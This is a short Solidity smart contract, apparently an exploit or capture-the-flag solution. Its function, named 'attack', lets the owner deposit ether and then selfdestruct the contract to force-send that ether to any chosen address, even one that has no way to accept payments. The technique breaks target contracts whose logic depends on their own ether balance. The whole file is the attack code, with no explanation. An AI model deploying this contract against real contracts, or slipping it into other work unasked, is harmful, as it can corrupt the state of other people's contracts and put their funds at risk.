// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Destroy {
    address private _owner;

    constructor() {
        _owner = msg.sender;
    }

    function deposit() public payable {
        require(msg.sender == _owner);
    }

    function attack(address payable ad) public payable {
        require(msg.sender == _owner);
        selfdestruct(ad);
    }
}